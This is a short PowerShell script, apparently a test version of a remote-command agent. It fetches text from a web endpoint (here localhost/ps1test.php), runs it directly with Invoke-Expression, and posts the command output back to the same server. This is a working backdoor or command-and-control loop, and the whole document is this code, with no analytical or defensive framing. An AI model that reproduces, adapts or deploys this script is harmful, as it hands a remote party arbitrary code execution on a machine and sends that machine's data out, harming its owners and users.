$url = "http://localhost/ps1test.php";

$cmdstr = $null;
$result = $null;

$webRequest = [System.Net.WebRequest]::Create($url);
$webRequest.Method = "GET";

   
[System.Net.WebResponse] $resp = $webRequest.GetResponse();
if($resp -ne $null) 
{
    $rs = $resp.GetResponseStream();
    [System.IO.StreamReader] $sr = New-Object System.IO.StreamReader -argumentList $rs;
    $cmdstr = $sr.ReadToEnd();
  
    $result = Invoke-Expression "$cmdstr";
    
    #echo $cmdstr
    #echo $result
      
}

if($result -ne $null) 
{
    $webUpload = [System.Net.WebRequest]::Create($url);
    $webUpload.Method = "POST";
    $webUpload.ContentType = "application/x-www-form-urlencoded";
    
    $enc = [System.Text.Encoding]::GetEncoding("UTF-8");
    
    $postData = "up="+ $result;
    
    [byte[]]$bytes = $enc.GetBytes($postData);
    
    
    if($bytes.length -gt 0) {
        $webUpload.ContentLength = $bytes.length;
        $uploadStream = $webUpload.GetRequestStream();
        $uploadStream.Write($bytes, 0, $bytes.length);
        $uploadStream.Flush();
        $uploadStream.Close();
    }
      
    [System.Net.WebResponse] $upload = $webUpload.GetResponse();
    if($upload -ne $null) 
    {
        $rs = $upload.GetResponseStream();
        [System.IO.StreamReader] $sr = New-Object System.IO.StreamReader -argumentList $rs;
        $result = $sr.ReadToEnd();
      
        echo $result;
        
    }
}
